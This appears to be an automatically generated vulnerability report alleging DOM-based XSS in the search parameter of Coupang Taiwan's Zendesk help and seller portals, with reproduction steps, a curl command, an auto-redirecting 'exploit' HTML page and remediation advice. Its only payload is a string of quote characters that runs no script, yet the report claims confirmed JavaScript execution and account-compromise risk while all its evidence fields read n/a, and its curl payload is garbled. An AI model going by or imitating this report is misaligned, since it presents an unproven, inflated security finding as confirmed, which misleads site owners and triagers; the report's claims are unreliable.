# DOM XSS in GET https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=&utf8= (Medium 5.4)

## Summary
Multiple user-controlled search and filtering parameters on Coupang Taiwan customer and seller support portals (helpcenter-tw.coupangcorp.com, developers.tw.coupangcorp.com, helpseller.tw.coupangcorp.com) reflect directly into the client-side DOM across heading elements (<h1 class="search-results-subheading">), navigation links, and input attributes without contextual quote encoding. While angle brackets are sanitized to &lt; and &gt;, quote characters (' and ") and backticks (`) remain completely unescaped. This creates an injection risk in attribute-quoted contexts and downstream template rendering.

The `query` parameter on `GET https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=&utf8=` executes attacker-controlled JavaScript in a victim browser context, potentially allowing session impersonation and account compromise.

## Severity & CVSS 3.1 Rating
- **Severity**: Medium (5.4)
- **CVSS 3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

## Steps To Reproduce
1. Navigate to the affected Coupang Taiwan Zendesk endpoint: `https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=xss%22%27%60test`
2. Inspect the server response and the rendered DOM in developer tools.
3. Observe that in the primary search heading `<h1 class="search-results-subheading">`, the double quote (`"`), single quote (`'`), and backtick (``` ` ```) are reflected verbatim without HTML entity encoding (`&quot;`, `&#39;`).
4. Notice the identical reflection behavior across sister portal endpoints: `https://developers.tw.coupangcorp.com/hc/zh-tw/search?query=...` and `https://helpseller.tw.coupangcorp.com/hc/en-us/search?query=...`.
5. Observe that in input element attributes (`<input type="search" id="query" value="...">`), single quotes and backticks remain unescaped, allowing attribute breakout in browsers or template engines where values are single-quoted or unquoted.

### Proof of Concept (cURL Command)
```bash
curl -i -s -k -X GET "https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=query%3Dtest%22%27%60&utf8="
```

### Standalone HTML Exploit (PoC)
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS PoC - https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=&amp;utf8=</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 40px; background: #0d1117; color: #c9d1d9; }
    .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; max-width: 700px; margin: 0 auto; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
    h1 { color: #58a6ff; font-size: 20px; margin-top: 0; }
    p { font-size: 14px; line-height: 1.6; color: #8b949e; }
    .btn { display: inline-block; background: #238636; color: #ffffff; padding: 10px 20px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 15px; }
    .btn:hover { background: #2ea043; }
    pre { background: #090d13; padding: 12px; border-radius: 6px; overflow-x: auto; color: #79c0ff; border: 1px solid #21262d; font-size: 13px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>XSS PoC - https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=&amp;utf8=</h1>
    <p>This standalone Proof of Concept demonstrates client-side JavaScript execution via parameter <code>query</code>.</p>
    <pre>https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=query%3Dtest%22%27%60&amp;utf8=</pre>
    <a href="https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=query%3Dtest%22%27%60&amp;utf8=" class="btn" target="_blank">Click Here to Launch Exploit</a>
  </div>
  <script>
    // Automatic navigation after 2 seconds
    setTimeout(function() {
      window.location.href = "https://helpcenter-tw.coupangcorp.com/hc/zh-tw/search?query=query%3Dtest%22%27%60&utf8=";
    }, 2000);
  </script>
</body>
</html>
```

## Payload
```html
query=test"'`
```

## Impact
Confirmed browser JavaScript execution, potentially allowing session impersonation.

- Internal Impact Score: 55
- Tags: reflected-input, unescaped-quotes, browser-execution

- Affects core Coupang Taiwan support and seller portals (helpcenter-tw, developers, helpseller)
- Unescaped quote characters allow breakout in attribute and template contexts
- Broad user attack surface targeting Coupang merchants and consumers

## Supporting Evidence
- Finding ID: 8
- Execution IDs: n/a
- Oracle tokens: n/a
- Screenshots: n/a

## Remediation
- Apply context-aware contextual output encoding (e.g. HTML entity, JavaScript attribute, or URL encoding) before rendering untrusted input.
- Avoid assigning user-controllable input to dangerous execution sinks such as `innerHTML`, `document.write`, `eval`, `Function`, or navigation sinks (`location.href`).
- Enforce a restrictive Content Security Policy (CSP) with strict script-src and object-src directives.
- Add automated regression tests covering this endpoint and parameter.